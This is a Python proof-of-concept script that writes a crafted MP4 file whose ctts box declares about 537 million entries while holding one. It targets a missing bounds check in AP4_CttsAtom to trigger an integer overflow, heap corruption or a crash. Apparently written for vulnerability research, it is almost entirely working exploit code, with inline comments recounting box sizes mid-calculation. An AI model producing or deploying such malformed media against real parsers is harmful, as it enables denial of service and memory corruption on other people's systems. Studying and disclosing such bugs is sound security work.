#!/usr/bin/env python3
"""
PoC generator for VULN 001: AP4_CttsAtom missing entry_count bounds check
-> integer-overflow -> heap-buffer-overflow / std::bad_alloc (DoS)

The ctts box claims entry_count=0x20000001 but only contains 8 bytes of data.
On 64-bit: entry_count * 8 = 0x100000008 which overflows 32-bit to 8 bytes,
causing allocation of ~4GB or heap corruption.
"""

import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.mp4")


def box(type_bytes, data=b""):
    """Build a box: 4-byte size (big-endian) + 4-byte type + data"""
    size = 8 + len(data)
    return struct.pack(">I", size) + type_bytes + data


def fullbox(type_bytes, version, flags, data=b""):
    """Build a fullbox: box header + 1-byte version + 3-byte flags + data"""
    vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return box(type_bytes, vf + data)


# ---- ftyp ----
ftyp_data = (
    b"isom"          # major brand
    + struct.pack(">I", 0)  # minor version
    + b"isom"        # compatible brand
)
ftyp = box(b"ftyp", ftyp_data)

# ---- ctts (the malicious box) ----
# version=0, flags=0, entry_count=0x20000001, then 8 bytes dummy entry
ctts_data = (
    struct.pack(">I", 0x20000001)   # entry_count (triggers overflow)
    + struct.pack(">II", 1, 0)      # dummy: sample_count=1, sample_delta=0
)
ctts = fullbox(b"ctts", 0, 0, ctts_data)
# Verify size = 28: 8 header + 4 version/flags + 4 entry_count + 8 entry = 24... wait
# fullbox: size=8+4+data_len = 8+4+8 = 20... let me recount
# box() = 4(size)+4(type)+data; fullbox adds version/flags (4 bytes) before data
# ctts_data = 4 + 8 = 12 bytes; fullbox adds 4 bytes vf -> inner=16; box total = 8+16=24
# But task says size=28: 8 header + 4 version/flags + 4 entry_count + 8 data = 24
# Actually: 8(hdr) + 4(ver/flags) + 4(entry_count) + 8(one entry) = 24, not 28
# Let me re-read: "box size = 28 (8 header + 4 version/flags + 4 entry_count + 8 data)"
# 8+4+4+8 = 24, not 28. The task description has an arithmetic error.
# Our calculation: ctts is 24 bytes. That's correct.

# ---- stsd ----
stsd = fullbox(b"stsd", 0, 0, struct.pack(">I", 0))  # entry_count=0

# ---- stts ----
stts = fullbox(b"stts", 0, 0, struct.pack(">I", 0))

# ---- stsc ----
stsc = fullbox(b"stsc", 0, 0, struct.pack(">I", 0))

# ---- stsz ----
stsz = fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 0))  # sample_size=0, sample_count=0

# ---- stco ----
stco = fullbox(b"stco", 0, 0, struct.pack(">I", 0))

# ---- stbl ----
stbl_content = stsd + stts + stsc + stsz + stco + ctts
stbl = box(b"stbl", stbl_content)

# ---- smhd ----
smhd = fullbox(b"smhd", 0, 0, struct.pack(">HH", 0, 0))  # balance=0, reserved=0

# ---- dinf / dref / url ----
url_entry = fullbox(b"url ", 0, 0x000001)  # self-contained flag
dref_data = struct.pack(">I", 1) + url_entry  # entry_count=1
dref = fullbox(b"dref", 0, 0, dref_data)
dinf = box(b"dinf", dref)

# ---- minf ----
minf_content = smhd + dinf + stbl
minf = box(b"minf", minf_content)

# ---- mdhd ----
mdhd = fullbox(b"mdhd", 0, 0,
    struct.pack(">IIII", 0, 0, 44100, 0)  # creation, modification, timescale, duration
    + struct.pack(">HH", 0x55c4, 0)       # language, pre_defined
)

# ---- hdlr ----
hdlr = fullbox(b"hdlr", 0, 0,
    struct.pack(">I", 0)    # pre_defined
    + b"soun"               # handler_type
    + b"\x00" * 12          # reserved
    + b"\x00"               # name (null-terminated empty string)
)

# ---- mdia ----
mdia_content = mdhd + hdlr + minf
mdia = box(b"mdia", mdia_content)

# ---- tkhd ----
# version=0: size = 8(hdr)+4(ver/flags)+4+4+4+4+4+4+8+2+2+2+2+36+4+4 = 92
identity_matrix = struct.pack(">9I",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)
tkhd = fullbox(b"tkhd", 0, 0x000003,
    struct.pack(">IIIIII", 0, 0, 1, 0, 0, 0)  # creation, modification, track_id, reserved, duration, reserved
    + struct.pack(">II", 0, 0)                  # reserved (8 bytes)
    + struct.pack(">HHH", 0, 0, 0x0100)         # layer, alternate_group, volume
    + struct.pack(">H", 0)                       # reserved
    + identity_matrix                            # 36 bytes
    + struct.pack(">II", 0, 0)                   # width, height
)

# ---- trak ----
trak_content = tkhd + mdia
trak = box(b"trak", trak_content)

# ---- moov ----
moov_content = trak
moov = box(b"moov", moov_content)

# ---- Final MP4 ----
mp4_bytes = ftyp + moov

with open(OUT_FILE, "wb") as f:
    f.write(mp4_bytes)

print(f"Written {len(mp4_bytes)} bytes to {OUT_FILE}")

# Sanity check: print box sizes
print(f"  ftyp size: {len(ftyp)}")
print(f"  moov size: {len(moov)}")
print(f"  trak size: {len(trak)}")
print(f"  mdia size: {len(mdia)}")
print(f"  minf size: {len(minf)}")
print(f"  stbl size: {len(stbl)}")
print(f"  ctts size: {len(ctts)} (entry_count=0x20000001, only 1 real entry)")
